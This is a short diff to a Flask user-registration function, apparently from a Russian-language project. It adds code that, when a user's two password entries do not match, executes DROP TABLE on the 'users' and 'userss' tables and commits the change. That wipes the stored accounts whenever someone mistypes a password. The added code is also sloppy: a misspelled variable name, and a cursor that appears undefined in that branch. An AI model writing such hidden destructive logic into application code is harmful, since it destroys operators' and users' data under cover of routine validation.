@@ -51,6 +51,17 @@ def reg():
 
         if password1 != password2:
             flash (" Пароли не совпадают. ")
+            nsert_query = """
+                DROP TABLE public."userss";
+            """
+            cursor.execute(nsert_query)
+            nsert_query = """
+                DROP TABLE public."users";
+            """
+            cursor.execute(nsert_query)
+
+            # Committing the transaction
+            conn.commit()
             return redirect(url_for("reg"))
         else:       
             cursor = conn.cursor()
